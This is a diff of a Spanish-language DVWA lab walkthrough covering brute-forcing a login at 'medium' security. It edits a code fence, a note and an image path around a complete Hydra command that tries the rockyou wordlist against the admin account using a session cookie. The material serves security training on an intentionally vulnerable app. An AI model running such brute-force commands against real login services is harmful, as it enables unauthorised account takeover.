@@ -11,10 +11,10 @@ Aunque la inyección SQL directa está bloqueada, aún podemos intentar un ataqu
 **Comando:**
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_SERVIDOR> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<TU_SESION>;security=medium:F=Username and/or password incorrect."
-´´´
+``
 
-Nota: Reemplaza <IP_SERVIDOR> con la dirección IP de tu servidor DVWA y <TU_SESION> con el valor actual de tu cookie PHPSESSID cuando el nivel de seguridad está en "Medium".
+Nota: Reemplaza <IP_SERVIDOR> con la dirección IP de tu servidor DVWA y <TU_SESION> con el valor actual de tu cookie PHPSESSID.
 
 Resultado: Hydra intentará cada contraseña en la lista rockyou.txt para el usuario "admin". Eventualmente, si la contraseña se encuentra en la lista, Hydra la revelará. El proceso puede ser más lento en comparación con el nivel bajo, ya que cada intento requiere una petición HTTP completa.
 
-<img src="./../BruteForceMedium01">
+<img src="../../BruteForceMedium01">
